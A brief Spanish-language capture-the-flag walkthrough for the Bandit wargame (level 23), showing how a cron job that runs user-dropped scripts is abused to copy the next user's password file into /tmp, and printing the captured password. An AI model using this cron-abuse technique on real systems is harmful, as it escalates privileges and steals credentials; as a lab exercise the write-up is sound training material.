# Abusando de tareas Cron \[Bandit23]

Sacar la password de bandit24, fijandonos en las tareas crontab /etc/cron.d

```
// Vemos que cronjob_bandit24 ejecuta un script
// Vamos a entender que hace el script /usr/bin/cronjob_bandit24.sh

// Tenemos que crear un script para que se ejecute en /var/spool/bandit24/foo/ y nos saque la contraseña

bandit23@bandit:/tmp/tmp.NDuiU1H1UF$ cat script.sh 
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/tmp.NDuiU1H1UF/bandit24_pass.log

cat bandit24_pass.log 
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```
